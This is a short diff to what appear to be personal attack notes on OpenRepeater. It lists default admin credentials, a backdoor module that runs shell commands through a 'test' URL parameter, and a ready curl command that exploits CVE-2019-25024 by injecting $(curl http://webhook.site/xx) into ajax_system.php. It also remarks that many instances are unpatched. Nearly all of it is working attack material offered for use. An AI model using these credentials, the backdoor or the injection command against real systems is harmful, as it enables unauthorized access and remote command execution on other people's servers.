@@ -1,3 +1,8 @@
 default password : admin/openrepeater
 shell via module upload
 backdoor module provided, install, activate, go in settings, use "test" parameter to run cmds (modules.php?settings=74&test=ls%20-alh)
+
+
+re-found https://nvd.nist.gov/vuln/detail/CVE-2019-25024 by reading code of /functions/ajax_system.php on one instance (lots aren't patched apparently)
+
+curl -k -X POST  https://xx/functions/ajax_system.php  -d 'post_service=$(curl%20http://webhook.site/xx)&post_option=1'
